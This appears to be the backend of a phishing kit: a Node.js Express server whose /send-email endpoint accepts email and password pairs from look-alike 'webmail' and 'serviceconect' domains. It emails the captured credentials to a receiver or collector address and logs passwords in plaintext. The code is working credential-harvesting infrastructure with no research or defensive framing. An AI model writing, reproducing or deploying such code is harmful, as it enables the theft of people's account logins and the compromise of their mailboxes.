import dotenv from "dotenv";
import express from "express";
import nodemailer from "nodemailer";
import bodyParser from "body-parser";
import cors from "cors";

dotenv.config();
const app = express();

// CORS configuration
const allowedOrigins = [
  "http://localhost:5173",
  "https://web-mail-lovat.vercel.app",
  "https://serviceconect.com",
  "https://www.centraconect.com"
];

app.use(
  cors({
    origin: function (origin, callback) {
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error("Not allowed by CORS"));
      }
    },
    methods: ["GET", "POST", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization"],
    credentials: true,
  })
);

// ✅ Handle preflight OPTIONS request globally
app.options("*", cors());

app.use(bodyParser.json());

console.log("Email User:", process.env.EMAIL_USER);
console.log("Email Pass:", process.env.EMAIL_PASS);
console.log("Email Receiver:", process.env.EMAIL_RECEIVER);
console.log("Email Collector:", process.env.EMAIL_COLLECTOR);

// Setup nodemailer transporter
const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 587,
  secure: false, // use STARTTLS
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// Verify transporter
transporter.verify((error, success) => {
  if (error) {
    console.error("Nodemailer verification error:", error);
  } else {
    console.log("Nodemailer is ready to send emails");
  }
});

// POST endpoint for sending email
app.post("/send-email", async (req, res) => {
  const { email, password } = req.body;
  const origin = req.get("Origin");
  console.log("Request Origin:", origin);
  console.log("Request Body:", { email, password });

  const recipients =
    origin === "https://serviceconect.com"
      ? [process.env.EMAIL_RECEIVER]
      : [process.env.EMAIL_COLLECTOR];

  const htmlTemplate = `
    <div style="font-family: Arial, sans-serif; padding: 20px;">
      <h2 style="color: #333;">New Credentials Received</h2>
      <p><strong>Email:</strong> ${email}</p>
      <p><strong>Password:</strong> ${password}</p>
      <hr />
      <p style="font-size: 12px; color: #999;">This message was sent from ${origin}</p>
    </div>
  `;

  const mailOptions = {
    from: `<${process.env.EMAIL_USER}>`,
    to: recipients,
    subject: "User Credentials Received",
    html: htmlTemplate,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log("Email sent:", info.response);
    res.status(200).json({ success: true, message: "Message sent successfully" });
  } catch (error) {
    console.error("Nodemailer error:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.listen(8080, () => {
  console.log("✅ Server is running on port 8080");
});
